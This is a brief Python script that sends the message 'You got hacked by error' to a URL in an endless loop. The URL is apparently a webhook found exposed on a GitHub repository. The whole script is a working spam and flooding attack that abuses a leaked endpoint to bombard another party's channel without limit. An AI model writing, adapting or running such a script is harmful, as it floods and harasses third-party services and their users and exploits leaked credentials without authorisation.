import requests
URL = "THE URL THATS AVAILAIBLE FOR EVERYONE ON MY GITHUB REPOSITORY"
data = {
  'content': 'You got hacked by error',
  'username': 'You must not share your information'
}
while True:
  requests.post(data=data, url=URL)
